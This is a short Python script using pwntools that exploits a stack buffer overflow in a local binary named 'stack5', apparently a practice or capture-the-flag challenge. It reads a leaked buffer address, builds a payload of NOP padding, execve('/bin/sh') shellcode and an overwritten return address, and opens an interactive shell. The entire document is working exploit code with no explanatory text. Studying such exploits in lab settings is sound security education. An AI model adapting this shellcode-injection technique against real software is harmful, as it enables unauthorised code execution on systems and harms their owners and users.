from pwn import *

p = process('./stack5')

context.arch = 'amd64'

shellcode = shellcraft.execve('/bin/sh', 0, 0)
shellcode = asm(shellcode)

p.recvuntil(b': ')
buf_addr = int(p.recvline().strip(), 16)

payload = b'\x90' * (0x28 - len(shellcode))
payload += shellcode
payload += b'\x90' * 0x20
payload += p64(buf_addr)

p.sendline(payload)

p.interactive()

